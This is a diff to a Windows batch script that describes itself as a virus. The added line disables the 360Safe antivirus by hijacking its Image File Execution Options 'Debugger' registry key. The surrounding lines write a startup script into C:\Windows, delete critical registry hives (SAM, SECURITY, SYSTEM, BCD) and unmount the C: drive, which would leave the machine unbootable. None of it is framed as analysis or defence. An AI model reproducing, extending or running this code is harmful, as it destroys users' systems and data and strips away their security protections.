@@ -2,6 +2,7 @@
 REM This is a VIRUS.
 REM (c) 2026 Eddie Chen Corp.
 REM 6.6.6
+if tasklist.exe|findstr "360Safe.exe" (reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" /v 360Safe.exe reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360Safe.exe" /v "Debugger" /t REG_SZ /d "/")
 cls
 echo "@echo off" >>"C:\Windows\AlwaysRunOnStart.bat"
 echo "REM This is a VIRUS." >>"C:\Windows\AlwaysRunOnStart.bat"
@@ -64,4 +65,5 @@ reg delete HKU\* /f
 reg delete HKLM\BCD00000000\* /f
 reg delete HKLM\SAM\* /f
 reg delete HKLM\SECURITY\* /f
+
 reg delete "HKLM\SYSTEM\*" /f && MOUNTVOL C: /D
